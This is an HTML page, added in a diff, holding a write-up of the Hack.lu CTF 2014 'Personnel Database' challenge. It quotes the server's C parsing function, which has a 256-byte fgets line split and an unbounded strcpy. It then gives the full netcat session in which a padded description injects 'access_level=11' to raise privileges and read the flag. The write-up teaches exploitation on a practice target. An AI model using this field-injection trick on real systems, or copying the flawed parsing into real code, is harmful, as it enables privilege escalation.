@@ -1,0 +1,173 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+    "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="application/xhtml+xml; charset=UTF-8" />
+<meta name="generator" content="AsciiDoc 8.6.9" />
+<title>Hack.lu CTF 2014: Personnel Database</title>
+<link href='http://afnom.net/css/wiki.css' rel='stylesheet' type='text/css'>
+
+<script src="http://afnom.net/js/wiki.js">
+</script>
+
+</head>
+<body class="article">
+<div id="header">
+<h1>Hack.lu CTF 2014: Personnel Database</h1>
+<span id="author">Piotr Kordy</span><br />
+</div>
+<div id="content">
+<div id="preamble">
+<div class="sectionbody">
+<div class="paragraph"><p><strong>Category:</strong> Exploiting
+<strong>Points:</strong> 150
+<strong>Author:</strong> TheJH</p></div>
+<div class="paragraph"><p><strong>Description:</strong></p></div>
+<div class="paragraph"><p>Lots of criminals in this area work for one big boss, but we have been unable
+to determine who he is. We know that their organization has one central
+personnel database that might also contain information about their boss,
+whose username is simply “boss”. However, when you register in their system,
+you only get access level zero, which is not enough for reading data about
+the boss - that guy is level 10. Do you think you can get around their
+protections?</p></div>
+<div class="paragraph"><p><a href="personnel_database_server_67e4ead6aeb111cc19de03d1f3d15fab.c">Download</a></p></div>
+<div class="paragraph"><p><code>nc wildwildweb.fluxfingers.net 1410</code></p></div>
+<div class="paragraph"><p>Note: The users dir will be wiped every 5 minutes.</p></div>
+<hr />
+</div>
+</div>
+<div class="sect1">
+<h2 id="_write_up">Write-up</h2>
+<div class="sectionbody">
+<div class="paragraph"><p>We are given a source code of the program running on the server. We can run the
+following commands:</p></div>
+<div class="ulist"><ul>
+<li>
+<p>
+<code>whoami</code> - prints user name
+</p>
+</li>
+<li>
+<p>
+<code>user</code> <em>username</em> - set user name for login
+</p>
+</li>
+<li>
+<p>
+<code>pass</code> <em>password</em> - provides password and logins us
+</p>
+</li>
+<li>
+<p>
+<code>register</code> <em>username:password</em> - registers new user
+</p>
+</li>
+<li>
+<p>
+&#8216;set_description` *description&#8217; - registers new user
+</p>
+</li>
+<li>
+<p>
+<code>logout</code> - logs us out and writes changes to the file
+</p>
+</li>
+<li>
+<p>
+<code>whois</code> <em>username</em> - prints info about user - we must have higher acces
+   rights than the user
+</p>
+</li>
+<li>
+<p>
+<code>levelup</code> <em>username</em> - increases the access level for the user, but we must
+   have higher access level.
+</p>
+</li>
+</ul></div>
+<div class="paragraph"><p>Each user have user name, password, access level and descripiton. Usernames are
+sanitized to match [a-zA-Z0-9_]{1,20}. The data about each user is stored in
+separate file in <code>users</code> directory. The interesting part is how the data about
+the user is read from the file:</p></div>
+<div class="listingblock">
+<div class="content"><!-- Generator: GNU source-highlight 3.1.7
+by Lorenzo Bettini
+http://www.lorenzobettini.it
+http://www.gnu.org/software/src-highlite -->
+<pre><tt><span style="font-weight: bold"><span style="color: #0000FF">struct</span></span> <span style="color: #008080">userdata</span> <span style="color: #990000">*</span><span style="font-weight: bold"><span style="color: #000000">read_userfile</span></span><span style="color: #990000">(</span><span style="color: #009900">char</span> <span style="color: #990000">*</span>user<span style="color: #990000">)</span> <span style="color: #FF0000">{</span>
+  <span style="font-weight: bold"><span style="color: #0000FF">struct</span></span> <span style="color: #008080">userdata</span> <span style="color: #990000">*</span>res <span style="color: #990000">=</span> <span style="font-weight: bold"><span style="color: #000000">calloc</span></span><span style="color: #990000">(</span><span style="color: #993399">1</span><span style="color: #990000">,</span> <span style="font-weight: bold"><span style="color: #0000FF">sizeof</span></span><span style="color: #990000">(*</span>res<span style="color: #990000">));</span>
+  <span style="font-weight: bold"><span style="color: #0000FF">if</span></span> <span style="color: #990000">(</span>res <span style="color: #990000">==</span> NULL<span style="color: #990000">)</span> <span style="font-weight: bold"><span style="color: #0000FF">return</span></span> NULL<span style="color: #990000">;</span>
+  <span style="color: #009900">int</span> fd <span style="color: #990000">=</span> <span style="font-weight: bold"><span style="color: #000000">open_userfile</span></span><span style="color: #990000">(</span>user<span style="color: #990000">,</span> O_RDONLY<span style="color: #990000">);</span>
+  <span style="font-weight: bold"><span style="color: #0000FF">if</span></span> <span style="color: #990000">(</span>fd <span style="color: #990000">==</span> <span style="color: #990000">-</span><span style="color: #993399">1</span><span style="color: #990000">)</span> <span style="font-weight: bold"><span style="color: #0000FF">return</span></span> NULL<span style="color: #990000">;</span>
+  <span style="color: #008080">FILE</span> <span style="color: #990000">*</span>f <span style="color: #990000">=</span> <span style="font-weight: bold"><span style="color: #000000">fdopen</span></span><span style="color: #990000">(</span>fd<span style="color: #990000">,</span> <span style="color: #FF0000">"r"</span><span style="color: #990000">);</span>
+  <span style="font-weight: bold"><span style="color: #0000FF">if</span></span> <span style="color: #990000">(</span>f <span style="color: #990000">==</span> NULL<span style="color: #990000">)</span> <span style="color: #FF0000">{</span> <span style="font-weight: bold"><span style="color: #000000">close</span></span><span style="color: #990000">(</span>fd<span style="color: #990000">);</span> <span style="font-weight: bold"><span style="color: #0000FF">return</span></span> NULL<span style="color: #990000">;</span> <span style="color: #FF0000">}</span>
+  <span style="color: #009900">char</span> line<span style="color: #990000">[</span><span style="color: #993399">256</span><span style="color: #990000">];</span>
+  <span style="font-weight: bold"><span style="color: #0000FF">while</span></span> <span style="color: #990000">(</span><span style="font-weight: bold"><span style="color: #000000">fgets</span></span><span style="color: #990000">(</span>line<span style="color: #990000">,</span> <span style="font-weight: bold"><span style="color: #0000FF">sizeof</span></span><span style="color: #990000">(</span>line<span style="color: #990000">),</span> f<span style="color: #990000">))</span> <span style="color: #FF0000">{</span>
+    <span style="font-weight: bold"><span style="color: #000000">rtrim</span></span><span style="color: #990000">(</span>line<span style="color: #990000">);</span>
+    <span style="color: #009900">char</span> <span style="color: #990000">*</span>key <span style="color: #990000">=</span> line<span style="color: #990000">;</span>
+    <span style="color: #009900">char</span> <span style="color: #990000">*</span>eqsign <span style="color: #990000">=</span> <span style="font-weight: bold"><span style="color: #000000">strchr</span></span><span style="color: #990000">(</span>line<span style="color: #990000">,</span> <span style="color: #FF0000">'='</span><span style="color: #990000">);</span>
+    <span style="font-weight: bold"><span style="color: #0000FF">if</span></span> <span style="color: #990000">(!</span>eqsign<span style="color: #990000">)</span> <span style="font-weight: bold"><span style="color: #0000FF">continue</span></span><span style="color: #990000">;</span>
+    <span style="color: #990000">*</span>eqsign <span style="color: #990000">=</span> <span style="color: #FF0000">'</span><span style="color: #CC33CC">\0</span><span style="color: #FF0000">'</span><span style="color: #990000">;</span>
+    <span style="color: #009900">char</span> <span style="color: #990000">*</span>value <span style="color: #990000">=</span> eqsign<span style="color: #990000">+</span><span style="color: #993399">1</span><span style="color: #990000">;</span>
+
+    <span style="font-weight: bold"><span style="color: #0000FF">if</span></span> <span style="color: #990000">(!</span><span style="font-weight: bold"><span style="color: #000000">strcmp</span></span><span style="color: #990000">(</span>key<span style="color: #990000">,</span> <span style="color: #FF0000">"hash"</span><span style="color: #990000">))</span> res<span style="color: #990000">-&gt;</span>hash <span style="color: #990000">=</span> <span style="font-weight: bold"><span style="color: #000000">atoll</span></span><span style="color: #990000">(</span>value<span style="color: #990000">);</span>
+    <span style="font-weight: bold"><span style="color: #0000FF">else</span></span> <span style="font-weight: bold"><span style="color: #0000FF">if</span></span> <span style="color: #990000">(!</span><span style="font-weight: bold"><span style="color: #000000">strcmp</span></span><span style="color: #990000">(</span>key<span style="color: #990000">,</span> <span style="color: #FF0000">"access_level"</span><span style="color: #990000">))</span> res<span style="color: #990000">-&gt;</span>access_level <span style="color: #990000">=</span> <span style="font-weight: bold"><span style="color: #000000">atoi</span></span><span style="color: #990000">(</span>value<span style="color: #990000">);</span>
+    <span style="font-weight: bold"><span style="color: #0000FF">else</span></span> <span style="font-weight: bold"><span style="color: #0000FF">if</span></span> <span style="color: #990000">(!</span><span style="font-weight: bold"><span style="color: #000000">strcmp</span></span><span style="color: #990000">(</span>key<span style="color: #990000">,</span> <span style="color: #FF0000">"description"</span><span style="color: #990000">))</span> <span style="font-weight: bold"><span style="color: #000000">strcpy</span></span><span style="color: #990000">(</span>res<span style="color: #990000">-&gt;</span>description<span style="color: #990000">,</span> value<span style="color: #990000">);</span>
+    <span style="font-weight: bold"><span style="color: #0000FF">else</span></span> <span style="font-weight: bold"><span style="color: #000000">printf</span></span><span style="color: #990000">(</span><span style="color: #FF0000">"fatal error: bad key </span><span style="color: #CC33CC">\"</span><span style="color: #FF0000">%s</span><span style="color: #CC33CC">\"</span><span style="color: #FF0000"> in config, aborting</span><span style="color: #CC33CC">\n</span><span style="color: #FF0000">"</span><span style="color: #990000">,</span> key<span style="color: #990000">),</span> <span style="font-weight: bold"><span style="color: #000000">exit</span></span><span style="color: #990000">(</span><span style="color: #993399">1</span><span style="color: #990000">);</span>
+  <span style="color: #FF0000">}</span>
+  <span style="font-weight: bold"><span style="color: #0000FF">return</span></span> res<span style="color: #990000">;</span>
+<span style="color: #FF0000">}</span></tt></pre></div></div>
+<div class="paragraph"><p>Each line is parsed separatly, but it can be at
+most 256 bytes (size of the buffer used). So line longer than 256 bytes will be
+read as two separate lines. Here is the example file with user&#8217;s data:</p></div>
+<div class="listingblock">
+<div class="content">
+<pre><code>hash=770370358
+access_level=0
+description=some description with = sign</code></pre>
+</div></div>
+<div class="paragraph"><p>The idea is to submit line with proper length that will be interpreted as two
+lines. In this way we can set our priviliges to high value.</p></div>
+<div class="paragraph"><p>Here is the list of commands that gives us the flag:</p></div>
+<div class="listingblock">
+<div class="content">
+<pre><code>nc wildwildweb.fluxfingers.net 1410
+&gt; register a:password
+user created successfully
+&gt; set_description ************************************************************************************** <br > *********************************************************************************************************** <br > **************************************************access_level=11
+description set
+&gt; logout
+Uh, who are you again? I have forgotten.
+&gt; user a
+username accepted, please provide password
+&gt; pass password
+login ok
+&gt; whois boss
+user    boss
+level   10
+descr   "flag{this_is_why_gets_is_better_than_fgets}"</code></pre>
+</div></div>
+</div>
+</div>
+<div class="sect1">
+<h2 id="_other_write_ups_and_resources">Other write-ups and resources</h2>
+<div class="sectionbody">
+<div class="ulist"><ul>
+<li>
+<p>
+<a href="thejh_exploit.py">Exploit in Python by @TheJH</a>
+</p>
+</li>
+</ul></div>
+</div>
+</div>
+</div>
+<div id="footnotes"><hr /></div>
+<div id="footer">
+<div id="footer-text">
+Last updated
+ 2014-10-23 17:02:24 BST
+</div>
+</div>
+</body>
+</html>
